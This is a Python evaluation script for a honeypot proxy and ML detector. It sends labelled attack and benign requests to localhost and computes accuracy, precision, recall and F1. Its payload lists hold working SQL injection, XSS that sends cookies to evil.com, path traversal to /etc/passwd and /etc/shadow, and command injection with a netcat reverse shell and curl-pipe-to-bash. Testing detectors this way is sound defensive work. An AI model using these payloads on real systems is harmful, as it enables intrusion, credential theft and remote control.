#!/usr/bin/env python3
"""
Experiment 1: Attack Detection Evaluation
Sends labelled attack and benign payloads through the proxy and ML API.
Records: TP, FP, TN, FN → Accuracy, Precision, Recall, F1
"""

import requests, json, time, random, csv
from datetime import datetime
from pathlib import Path

PROXY   = "http://localhost:8080"
ML_API  = "http://localhost:5000"
OUT_DIR = Path(__file__).parent / "results"
OUT_DIR.mkdir(exist_ok=True)

# ── Payloads ──────────────────────────────────────────────────────────────────

ATTACKS = {
    "SQLi": [
        ("GET", "/banking/search?q=1' OR 1=1--",         {}),
        ("GET", "/banking/search?q=1 UNION SELECT username,password FROM users--", {}),
        ("GET", "/banking/api/data?category=' OR '1'='1", {}),
        ("POST","/banking/login", {"username":"admin'--","password":"x"}),
        ("GET", "/ecommerce/search?q='; DROP TABLE users;--", {}),
        ("GET", "/healthcare/search?q=1' AND SLEEP(5)--", {}),
        ("GET", "/banking/search?q=1'; INSERT INTO users VALUES('hacker','pass','h@x.com')--", {}),
        ("GET", "/blog/search?q=1 OR 1=1#",              {}),
        ("GET", "/api_service/search?q=' HAVING 1=1--",  {}),
        ("POST","/corporate/login", {"username":"' OR '1'='1","password":"anything"}),
        ("GET", "/banking/search?q=admin'/*",             {}),
        ("GET", "/ecommerce/api/data?category=1 AND 1=2 UNION SELECT table_name FROM information_schema.tables--", {}),
        ("GET", "/healthcare/search?q=1;SELECT * FROM users",  {}),
        ("POST","/admin_panel/login", {"username":"root'--","password":""}),
        ("GET", "/banking/search?q=1' WAITFOR DELAY '0:0:5'--", {}),
    ],
    "XSS": [
        ("GET", "/banking/search?q=<script>alert(document.cookie)</script>", {}),
        ("GET", "/ecommerce/search?q=<img src=x onerror=alert(1)>", {}),
        ("POST","/banking/review", {"item_id":"1","content":"<script>fetch('http://evil.com?c='+document.cookie)</script>","author":"x"}),
        ("GET", "/healthcare/search?q=<svg onload=alert(1)>", {}),
        ("GET", "/blog/search?q=javascript:alert(1)", {}),
        ("GET", "/banking/search?q=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E", {}),
        ("GET", "/ecommerce/search?q=<body onload=alert(1)>", {}),
        ("POST","/corporate/review", {"item_id":"1","content":"<iframe src=javascript:alert(1)>","author":"test"}),
        ("GET", "/api_service/search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>", {}),
        ("GET", "/banking/search?q=\"><script>alert('XSS')</script>", {}),
        ("GET", "/healthcare/search?q=<input autofocus onfocus=alert(1)>", {}),
        ("GET", "/blog/search?q=<details open ontoggle=alert(1)>", {}),
        ("POST","/ecommerce/review", {"item_id":"2","content":"<math><mtext></mtext><mglyph><svg><mtext></mtext><textarea><title><img src=x onerror=alert(1)>","author":"xss"}),
        ("GET", "/corporate/search?q=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E", {}),
        ("GET", "/admin_panel/search?q=<script>new Image().src='http://evil.com/log?'+document.cookie</script>", {}),
    ],
    "Path_Traversal": [
        ("GET", "/banking/search?q=../../../etc/passwd",   {}),
        ("GET", "/ecommerce/search?q=..%2F..%2F..%2Fetc%2Fshadow", {}),
        ("GET", "/banking/../../etc/passwd",               {}),
        ("GET", "/healthcare/search?q=....//....//etc/passwd", {}),
        ("GET", "/banking/search?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd", {}),
        ("GET", "/ecommerce/../../../windows/system32/drivers/etc/hosts", {}),
        ("GET", "/blog/search?q=..\\..\\..\\windows\\system.ini", {}),
        ("GET", "/corporate/search?q=/etc/shadow",         {}),
        ("GET", "/banking/search?q=%252e%252e%252fetc%252fpasswd", {}),
        ("GET", "/admin_panel/search?q=....//....//....//etc/passwd", {}),
    ],
    "Scanner": [
        ("GET", "/wp-admin",                   {}),
        ("GET", "/.env",                       {}),
        ("GET", "/phpmyadmin",                 {}),
        ("GET", "/.git/config",                {}),
        ("GET", "/backup.sql",                 {}),
        ("GET", "/config.json",                {}),
        ("GET", "/server-status",              {}),
        ("GET", "/api/v2/config",              {}),
        ("GET", "/debug/vars",                 {}),
        ("GET", "/backup/database_full_2026.zip", {}),
    ],
    "DDoS": [
        ("GET", "/banking/",    {}),
        ("GET", "/ecommerce/",  {}),
        ("GET", "/healthcare/", {}),
        ("GET", "/blog/",       {}),
        ("GET", "/api_service/",{}),
    ],
    "Command_Injection": [
        ("GET", "/banking/search?q=; ls -la",          {}),
        ("GET", "/ecommerce/search?q=| cat /etc/passwd",{}),
        ("GET", "/banking/search?q=`whoami`",           {}),
        ("GET", "/healthcare/search?q=$(id)",           {}),
        ("GET", "/blog/search?q=; ping -c 5 evil.com",  {}),
        ("GET", "/banking/search?q=|| nc evil.com 4444 -e /bin/bash", {}),
        ("GET", "/corporate/search?q=; curl http://evil.com/shell.sh | bash", {}),
        ("GET", "/banking/search?q=%60id%60",           {}),
    ],
}

BENIGN = [
    ("GET", "/banking/",                                  {}),
    ("GET", "/banking/items",                             {}),
    ("GET", "/banking/search?q=savings",                  {}),
    ("GET", "/banking/search?q=loan",                     {}),
    ("GET", "/banking/item/1",                            {}),
    ("POST","/banking/login", {"username":"john.doe","password":"p@ssw0rd"}),
    ("GET", "/ecommerce/",                                {}),
    ("GET", "/ecommerce/items",                           {}),
    ("GET", "/ecommerce/search?q=headphones",             {}),
    ("GET", "/ecommerce/search?q=laptop",                 {}),
    ("GET", "/healthcare/",                               {}),
    ("GET", "/healthcare/search?q=checkup",               {}),
    ("GET", "/blog/",                                     {}),
    ("GET", "/blog/search?q=python",                      {}),
    ("GET", "/blog/search?q=docker",                      {}),
    ("GET", "/api_service/",                              {}),
    ("GET", "/api_service/items",                         {}),
    ("GET", "/corporate/",                                {}),
    ("GET", "/corporate/search?q=consulting",             {}),
    ("GET", "/admin_panel/",                              {}),
]

HEADERS_NORMAL  = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"}
HEADERS_SCANNER = {"User-Agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"}
HEADERS_NIKTO   = {"User-Agent": "Nikto/2.1.6"}

# ── ML API direct evaluation ──────────────────────────────────────────────────

def call_ml_xss(payload: str) -> float:
    try:
        r = requests.post(f"{ML_API}/api/detect/xss",
                          json={"payload": payload}, timeout=5)
        if r.status_code == 200:
            d = r.json()
            return d.get("probability", d.get("confidence", 0.5))
    except Exception:
        pass
    return 0.5

def call_ml_web(features: list) -> float:
    try:
        r = requests.post(f"{ML_API}/api/detect/web-attack",
                          json={"features": features}, timeout=5)
        if r.status_code == 200:
            d = r.json()
            return d.get("confidence", d.get("probability", 0.5))
    except Exception:
        pass
    return 0.5

def call_ml_ddos(req_rate: float, byte_rate: float) -> float:
    try:
        r = requests.post(f"{ML_API}/api/detect/ddos",
                          json={"req_rate": req_rate, "byte_rate": byte_rate,
                                "packet_count": int(req_rate * 10)}, timeout=5)
        if r.status_code == 200:
            d = r.json()
            return d.get("confidence", d.get("probability", 0.5))
    except Exception:
        pass
    return 0.5

# ── Proxy-level evaluation ────────────────────────────────────────────────────

def send_proxy(method, path, data=None, headers=None):
    url = f"{PROXY}{path}"
    hdrs = {**(headers or HEADERS_NORMAL)}
    try:
        t0 = time.time()
        if method == "GET":
            r = requests.get(url, headers=hdrs, timeout=6, allow_redirects=True)
        else:
            r = requests.post(url, data=data, headers=hdrs, timeout=6, allow_redirects=True)
        elapsed = time.time() - t0
        # Honeypot fingerprints
        routed_to_honeypot = (
            r.status_code in (200, 302) and
            any(marker in r.text.lower() for marker in
                ["quickbank", "shopnow", "healthplus", "devnotes",
                 "cloudapi", "quantumtech", "infrahub", "honeypot",
                 "leaked", "query result", "warning: 1247 rows"])
        )
        return r.status_code, routed_to_honeypot, elapsed
    except Exception as e:
        return 0, False, 0.0

# ── Main experiment ───────────────────────────────────────────────────────────

def run():
    results = []
    print(f"\n{'='*60}")
    print("  DeceptiCloud — Experiment 1: Attack Detection Evaluation")
    print(f"{'='*60}\n")

    # ── ATTACK payloads (true_label = 1 = malicious) ──
    for attack_type, payloads in ATTACKS.items():
        hdrs = HEADERS_SCANNER if attack_type in ("SQLi","Scanner") else HEADERS_NORMAL
        print(f"  [{attack_type}] Sending {len(payloads)} attack payloads...")
        for method, path, data in payloads:
            status, detected, elapsed = send_proxy(method, path, data, hdrs)
            results.append({
                "attack_type": attack_type,
                "true_label":  1,
                "predicted":   1 if detected else 0,
                "status_code": status,
                "elapsed_ms":  round(elapsed * 1000, 1),
                "path":        path[:80],
            })
            time.sleep(0.15)

    # ── DDoS burst simulation ──
    print("  [DDoS] Sending burst (50 rapid requests)...")
    for i in range(50):
        method, path, data = random.choice(ATTACKS["DDoS"])
        status, detected, elapsed = send_proxy(method, path, data, HEADERS_NORMAL)
        results.append({
            "attack_type": "DDoS",
            "true_label":  1,
            "predicted":   1 if detected else 0,
            "status_code": status,
            "elapsed_ms":  round(elapsed * 1000, 1),
            "path":        path[:80],
        })
        time.sleep(0.02)

    # ── BENIGN payloads (true_label = 0 = legitimate) ──
    print(f"  [Benign] Sending {len(BENIGN)} benign requests...")
    for method, path, data in BENIGN:
        status, detected, elapsed = send_proxy(method, path, data, HEADERS_NORMAL)
        results.append({
            "attack_type": "Benign",
            "true_label":  0,
            "predicted":   1 if detected else 0,
            "status_code": status,
            "elapsed_ms":  round(elapsed * 1000, 1),
            "path":        path[:80],
        })
        time.sleep(0.2)

    # ── Compute metrics ──
    TP = sum(1 for r in results if r["true_label"]==1 and r["predicted"]==1)
    FP = sum(1 for r in results if r["true_label"]==0 and r["predicted"]==1)
    TN = sum(1 for r in results if r["true_label"]==0 and r["predicted"]==0)
    FN = sum(1 for r in results if r["true_label"]==1 and r["predicted"]==0)

    precision = TP / (TP + FP) if (TP + FP) > 0 else 0
    recall    = TP / (TP + FN) if (TP + FN) > 0 else 0
    f1        = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0
    accuracy  = (TP + TN) / len(results) if results else 0
    fpr       = FP / (FP + TN) if (FP + TN) > 0 else 0

    # Per-category
    per_cat = {}
    for cat in list(ATTACKS.keys()) + ["Benign"]:
        cat_rows = [r for r in results if r["attack_type"] == cat]
        if not cat_rows:
            continue
        if cat == "Benign":
            detected_wrong = sum(1 for r in cat_rows if r["predicted"] == 1)
            per_cat[cat] = {"total": len(cat_rows), "FP": detected_wrong,
                            "FPR": round(detected_wrong/len(cat_rows), 3)}
        else:
            detected_right = sum(1 for r in cat_rows if r["predicted"] == 1)
            per_cat[cat] = {"total": len(cat_rows), "TP": detected_right,
                            "TPR": round(detected_right/len(cat_rows), 3)}

    summary = {
        "timestamp":   datetime.now().isoformat(),
        "total_samples": len(results),
        "TP": TP, "FP": FP, "TN": TN, "FN": FN,
        "accuracy":   round(accuracy, 4),
        "precision":  round(precision, 4),
        "recall":     round(recall, 4),
        "f1_score":   round(f1, 4),
        "false_positive_rate": round(fpr, 4),
        "per_category": per_cat,
        "avg_latency_ms": round(sum(r["elapsed_ms"] for r in results) / len(results), 1),
    }

    # Save
    out_json = OUT_DIR / "exp1_detection_results.json"
    out_csv  = OUT_DIR / "exp1_raw_results.csv"
    with open(out_json, "w") as f:
        json.dump(summary, f, indent=2)
    with open(out_csv, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=results[0].keys())
        w.writeheader(); w.writerows(results)

    # Print
    print(f"\n{'─'*50}")
    print(f"  RESULTS — DeceptiCloud Ensemble Detector")
    print(f"{'─'*50}")
    print(f"  Accuracy  : {accuracy*100:.2f}%")
    print(f"  Precision : {precision*100:.2f}%")
    print(f"  Recall    : {recall*100:.2f}%")
    print(f"  F1 Score  : {f1*100:.2f}%")
    print(f"  FPR       : {fpr*100:.2f}%")
    print(f"  TP={TP} FP={FP} TN={TN} FN={FN}")
    print(f"\n  Per-Category Detection Rate:")
    for cat, m in per_cat.items():
        if cat == "Benign":
            print(f"    {cat:<22} FPR={m['FPR']*100:.1f}% ({m['FP']}/{m['total']} false alarms)")
        else:
            print(f"    {cat:<22} TPR={m['TPR']*100:.1f}% ({m['TP']}/{m['total']} detected)")
    print(f"\n  Avg latency: {summary['avg_latency_ms']} ms")
    print(f"  Saved → {out_json}")
    print(f"  Saved → {out_csv}\n")
    return summary

if __name__ == "__main__":
    run()
